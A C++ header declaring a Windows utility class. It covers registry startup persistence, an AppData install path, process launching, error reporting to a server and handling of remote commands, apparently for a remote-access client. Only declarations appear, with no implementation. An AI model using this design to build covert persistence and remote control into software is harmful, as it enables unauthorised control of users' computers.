#pragma once

#include <Windows.h>
#include <string>
#include <tchar.h>
#include <stdio.h>


#include "settings.h"
#include "cmdRedirect.h"

class General
{
public:
	static bool regValueExists(HKEY hKey, LPCSTR keyPath, LPCSTR valueName);	//checks if a certain value exists in the registry
	static bool setStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args);	//registers a program in startup with supplied name, path to exe and startup arguments
	static bool directoryExists(const char* dirName);							//checks if directory exists
	static std::string getInstallFolder();											//gets install folder (example: C:\users\USER\AppData\Roaming\InstallDIR)
	static std::string getInstallPath(std::string instFolder);						//gets installpath (environment folder + folder name (if supplied) + file name)
	static std::string getCurrentPath();	//gets current path of executable

private:

public:		//functions
	static void startProcess(LPCTSTR lpApplicationName, LPTSTR lpArguments);		//starts a process
	static void handleError(int errType, bool errSevere);							//handles errors
	static void sendError(std::string errorMessage);								//sends error msg to server
	static void processCommand(std::string command);		//processes command
};
